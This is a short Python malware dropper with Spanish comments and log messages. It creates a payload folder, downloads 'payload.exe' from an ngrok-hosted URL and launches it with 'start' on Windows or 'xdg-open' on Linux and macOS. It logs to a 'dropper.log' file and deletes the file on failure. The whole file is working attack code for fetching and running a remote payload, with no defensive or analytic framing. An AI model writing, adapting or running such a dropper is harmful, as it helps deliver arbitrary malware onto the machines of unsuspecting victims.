import os
import logging
from utils import download_file, execute_command, clean_up

# Configuración del registro
logging.basicConfig(
    filename='logs/dropper.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# Configuración del payload
PAYLOAD_URL = 'https://hornet-alive-muskox.ngrok-free.app/payload/payload.exe'
PAYLOAD_DIR = os.path.join(os.path.dirname(__file__), '../payload')
PAYLOAD_PATH = os.path.join(PAYLOAD_DIR, 'payload.exe')

def download_payload(url, destination):
    """Descarga el payload desde la URL especificada y lo guarda en la ruta destino."""
    try:
        download_file(url, destination)
    except Exception as e:
        logging.error(f'Error al descargar el payload: {e}')
        raise

def run_payload(path):
    """Ejecuta el payload en la ruta especificada."""
    try:
        logging.info(f'Ejecutando el payload desde {path}')
        if os.name == 'nt':  # Windows
            execute_command(f'start {path}')
        else:  # Linux/MacOS
            execute_command(f'xdg-open {path}')
        logging.info('Payload ejecutado exitosamente')
    except Exception as e:
        logging.error(f'Error al ejecutar el payload: {e}')
        raise

def main():
    """Función principal del dropper."""
    try:
        # Crear el directorio de payload si no existe
        os.makedirs(PAYLOAD_DIR, exist_ok=True)

        # Descargar y ejecutar el payload
        download_payload(PAYLOAD_URL, PAYLOAD_PATH)
        run_payload(PAYLOAD_PATH)
    except Exception as e:
        logging.critical(f'Error crítico en el dropper: {e}')  # Registro de error crítico
        print(f"Ha ocurrido un error crítico: {e}")  # Mensaje de error crítico para el usuario
        clean_up(PAYLOAD_PATH)  # Limpiar el archivo en caso de error

if __name__ == "__main__":
    main()  # Llama a la función principal para ejecutar el dropper
